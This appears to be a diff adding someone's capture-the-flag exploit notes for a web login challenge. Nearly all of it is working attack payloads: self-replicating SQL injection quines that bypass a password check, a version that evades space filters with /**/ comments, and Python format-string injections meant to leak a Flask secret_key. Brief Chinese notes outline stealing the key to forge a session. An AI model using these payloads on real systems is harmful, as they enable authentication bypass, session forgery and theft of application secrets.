@@ -1,0 +1,60 @@
+pid = 9
+
+# username
+
+admin
+
+# password
+
+' UNION SELECT 'admin' AS username, 
+substr(s.q, 1, 112)||quote(s.q)||substr(s.q, 117)
+AS password FROM (SELECT ''' UNION SELECT ''admin'' AS username, 
+substr(s.q, 1, 112)||quote(s.q)||substr(s.q, 117)
+AS password FROM (SELECT ''%s'' AS q) AS s--' AS q) AS s--
+
+# token
+
+ADMIN-E864E8E8F230374AA7B3B0CE441E209A
+
+' UNION SELECT 'admin' AS username, 
+substr(s.q, 1, 112)||quote(s.q)||substr(s.q, 117)
+AS password FROM (SELECT ''' UNION SELECT ''admin'' AS username, 
+substr(s.q, 1, 112)||quote(s.q)||substr(s.q, 117)
+AS password FROM (SELECT ''%s'' AS q) AS s--' AS q) AS s--
+
+SELECT username, password FROM users WHERE username='admin' AND password='
+
+
+# username
+
+admin
+
+# password
+
+'/**/UNION/**/SELECT/**/'admin'/**/AS/**/username,/**/substr(s.q,/**/1,/**/153)||quote(s.q)||substr(s.q,/**/158)/**/AS/**/password/**/FROM/**/(SELECT/**/'''/**/UNION/**/SELECT/**/''admin''/**/AS/**/username,/**/substr(s.q,/**/1,/**/153)||quote(s.q)||substr(s.q,/**/158)/**/AS/**/password/**/FROM/**/(SELECT/**/''%s''/**/AS/**/q)/**/AS/**/s--'/**/AS/**/q)/**/AS/**/s--
+
+ADMIN-E864E8E8F230374AA7B3B0CE441E209A
+
+# username
+
+{flag.__init__.__globals__[app].secret_key}
+
+# password
+
+'/**/UNION/**/SELECT/**/'{flag.__init__.__globals__[app].secret_key}'/**/AS/**/username,/**/substr(s.q,/**/1,/**/191)||quote(s.q)||substr(s.q,/**/196)/**/AS/**/password/**/FROM/**/(SELECT/**/'''/**/UNION/**/SELECT/**/''{flag.__init__.__globals__[app].secret_key}''/**/AS/**/username,/**/substr(s.q,/**/1,/**/191)||quote(s.q)||substr(s.q,/**/196)/**/AS/**/password/**/FROM/**/(SELECT/**/''%s''/**/AS/**/q)/**/AS/**/s--'/**/AS/**/q)/**/AS/**/s--
+
+%5Cu0061DMIN-E864E8E8F230374AA7B3B0CE441E209A
+\\u0061DMIN-E864E8E8F230374AA7B3B0CE441E209A
+
+
+{flag.__init__}
+
+
+
+
+
+username.__init__.__globals__[app].secret_key
+
+拿secret_key > 改session > 丟上面的
+
+如何拿secret_key?
